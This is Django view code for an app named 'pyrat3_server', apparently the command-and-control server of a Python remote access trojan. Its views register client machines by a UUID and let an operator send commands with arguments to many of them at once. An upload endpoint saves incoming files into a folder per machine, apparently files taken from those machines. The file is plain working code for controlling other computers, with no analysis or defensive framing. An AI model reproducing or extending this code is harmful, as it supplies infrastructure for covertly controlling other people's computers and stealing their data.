from django.shortcuts import render
from django.views import generic
from .models import Client
from .forms import ClientSendCommandForm, ClientSendFileForm
from django.core.exceptions import ObjectDoesNotExist
from django.core.files.storage import FileSystemStorage
from django.conf import settings
from django.shortcuts import get_object_or_404

from rest_framework import generics
from rest_framework.response import Response
from rest_framework import views
from rest_framework import status
from .serializers import ClientSerializer
from django.utils import timezone
import time
import random
import string
from os import path
import uuid

from datetime import datetime
import pytz

from ast import literal_eval

# Create your views here.
from django.http import HttpResponse


def get_unique_id(size=6, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))


class Index(generic.ListView, generic.edit.FormMixin):

    model = Client
    context_object_name = 'clients'
    template_name = 'pyrat3_server/index.html'
    form_class = ClientSendCommandForm
    initial = {'last_command_id': get_unique_id}
    success_url = 'index'

    def post(self, request, *args, **kwargs):
        form_class = self.get_form_class()
        form = self.get_form(form_class)
        if form.is_valid():
            for pc_uuid in form.cleaned_data['pc_uuid']:
                print(form.cleaned_data)
                print(pc_uuid)
                client = Client.objects.get(pc_uuid=pc_uuid)
                client.last_command_id = form.cleaned_data['last_command_id']
                client.last_command = form.cleaned_data['last_command']
                client.last_command_datetime = datetime.now(tz=pytz.utc)
                client.last_command_args = form.cleaned_data['last_command_args']
                client.save()
            return self.form_valid(form)
        else:
            return self.form_invalid(form)


class ClientList(views.APIView):

    def get(self, request, format=None):
        clients = Client.objects.all()
        serializer = ClientSerializer(clients, many=True)
        return Response(serializer.data)

    def post(self, request, format=None):
        serializer = ClientSerializer(data=request.data)
        if serializer.is_valid():
            try:
                client = Client.objects.get(pc_uuid=request.data['pc_uuid'])
                changes = []
                for key, value in request.data.items():
                    if getattr(client, key) != request.data[key]:
                        changes.append(key)
                        setattr(client, key, value)
                client.save()
                if changes:
                    return Response(data={'pc_uuid': client.pc_uuid, 'message': 'Exists, modified'},
                                    status=status.HTTP_200_OK)
                else:
                    return Response(data={'pc_uuid': client.pc_uuid, 'message': 'Exists, not modified'},
                                    status=status.HTTP_200_OK)
            except ObjectDoesNotExist:
                serializer.save()
                return Response(data={'pc_uuid': serializer.data['pc_uuid'], 'message': 'New, added'},
                                status=status.HTTP_201_CREATED)
        return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)


class ClientDetail(generics.RetrieveUpdateAPIView):
    lookup_field = 'pc_uuid'
    queryset = Client.objects.all()
    serializer_class = ClientSerializer


class ClientUploadFile(generic.FormView):
    template_name = 'pyrat3_server/upload.html'
    form_class = ClientSendFileForm

    def post(self, request, *args, **kwargs):
        """
        Handle POST requests: instantiate a form instance with the passed
        POST variables and then check if it's valid.
        """
        form = self.get_form()
        if form.is_valid():
            pc_uuid = self.kwargs['pc_uuid']
            file = form.cleaned_data['file']
            fs = FileSystemStorage(location=path.join(settings.MEDIA_ROOT, pc_uuid))
            fs.save(file.name, file)
            return self.form_valid(form)
        else:
            return self.form_invalid(form)

    def form_valid(self, form):
        return HttpResponse('OK')
